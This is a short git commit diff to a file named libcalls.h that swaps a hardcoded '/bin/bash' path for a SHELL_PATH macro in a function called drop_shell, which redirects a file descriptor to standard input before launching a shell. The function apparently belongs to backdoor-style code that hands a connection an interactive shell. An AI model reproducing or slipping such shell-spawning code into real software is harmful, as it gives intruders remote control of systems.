58ebcd9bf98fc10cbb9c0c00fe3636d228392079
Phizo <wfs225-dg@hotmail.com>
2014-07-24 11:42:09 +1000

    Update libcalls.h

--- libcalls.h
+++ libcalls.h
@@ -62,7 +62,7 @@ void fini(void)
 
 void drop_shell(int fd)
 {
-    char *argv[] = {"/bin/bash", "--norc", NULL};
+    char *argv[] = {SHELL_PATH, "--norc", NULL};
     char *envp[] = {NULL};
 
     dup2(fd, 0);
